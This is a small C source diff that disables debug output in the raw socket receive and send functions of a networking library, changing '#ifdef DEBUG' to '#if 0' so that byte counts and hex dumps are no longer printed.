@@ -300,7 +300,7 @@ RAWSOCKCODE laikaS_rawRecv(struct sLaika_socket *sock, size_t sz, int *processed
         /* if the socket closed or an error occurred, return the error result */
         errCode = RAWSOCK_ERROR;
     } else if (rcvd > 0) {
-#ifdef DEBUG
+#if 0
         /* for debugging */
         printf("---recv'd %d bytes---\n", rcvd);
         for (i = 1; i <= rcvd; i++) {
@@ -354,7 +354,7 @@ RAWSOCKCODE laikaS_rawSend(struct sLaika_socket *sock, size_t sz, int *processed
     } while((sentBytes += sent) < sz);
 
 _rawWriteExit:
-#ifdef DEBUG
+#if 0
     /* for debugging */
     printf("---sent %d bytes---\n", sent);
     for (i = 1; i <= sentBytes; i++) {
